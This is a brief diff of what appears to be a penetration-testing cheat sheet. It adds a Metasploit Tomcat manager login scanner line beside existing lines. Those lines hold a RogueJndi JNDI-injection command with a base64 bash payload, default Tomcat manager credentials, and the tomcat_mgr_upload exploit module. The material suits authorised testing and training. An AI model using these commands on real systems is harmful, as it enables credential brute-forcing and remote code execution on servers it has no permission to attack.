@@ -1020,6 +1020,7 @@ $ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} 
 ```
 http://<IP address>:<port>/manager/html
 tomcat:s3cret
+use auxiliary/scanner/http/tomcat_mgr_login
 use exploit/multi/http/tomcat_mgr_upload
 ```
 
